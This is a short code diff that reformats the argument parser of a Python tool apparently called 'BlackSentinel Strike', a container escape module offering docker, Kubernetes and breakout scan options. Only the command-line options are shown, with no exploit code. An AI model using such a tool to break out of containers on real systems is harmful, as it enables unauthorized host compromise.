+    parser = argparse.ArgumentParser(description="BlackSentinel Strike - Container Escape Module")
+    parser.add_argument("--target", "-t", default="localhost", help="Target host (default: localhost)")
     parser.add_argument(
-        "--target", "-t",
-        default="localhost",
-        help="Target host (default: localhost)"
+        "--scan", "-s", choices=["docker", "k8s", "breakout", "all"], default="all", help="Scan type (default: all)"
     )
-    parser.add_argument(
-        "--scan", "-s",
-        choices=["docker", "k8s", "breakout", "all"],
-        default="all",
-        help="Scan type (default: all)"
-    )
-    parser.add_argument(
-        "--technique",
-        help="Run specific technique by name"
-    )
-    parser.add_argument(
-        "--verbose", "-v",
-        action="store_true",
-        help="Enable verbose output"
-    )
-    parser.add_argument(
-        "--cleanup", "-c",
-        action="store_true",
-        help="Clean up artifacts after scan"
-    )
-    parser.add_argument(
-        "--output", "-o",
-        help="Output file for results"
-    )
+    parser.add_argument("--technique", help="Run specific technique by name")
+    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
+    parser.add_argument("--cleanup", "-c", action="store_true", help="Clean up artifacts after scan")
+    parser.add_argument("--output", "-o", help="Output file for results")
 
     args = parser.parse_args()
 
